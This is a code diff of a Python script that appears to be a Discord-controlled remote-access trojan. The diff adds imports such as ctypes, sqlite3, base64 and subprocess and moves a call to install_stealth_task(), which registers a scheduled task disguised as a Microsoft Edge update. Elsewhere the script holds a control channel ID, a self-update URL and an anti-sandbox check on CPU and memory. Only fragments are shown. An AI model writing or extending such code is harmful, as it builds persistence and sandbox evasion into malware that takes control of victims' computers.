@@ -1,3 +1,13 @@
+import asyncio
+import array
+import base64
+import ctypes
+import io
+import json
+import os
+import shutil
+import sqlite3
+import subprocess
 import sys
 import tempfile
 import threading
@@ -27,7 +37,7 @@ CONTROL_CHANNEL_ID = 1536306696832426054
 RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/maintudu/refs/heads/main/bot.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
 TASK_DESC = "Microsoft Edge Update Task Machine UA"
-install_stealth_task()
+
 def check_environment() -> bool:
     if os.cpu_count() and os.cpu_count() < 2: return False
     if psutil.virtual_memory().total < 3 * (1024 ** 3): return False
@@ -368,7 +378,7 @@ async def on_ready():
             f"Для справки: `!menu`"
         )
         await ch.send(msg)
-
+install_stealth_task()
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
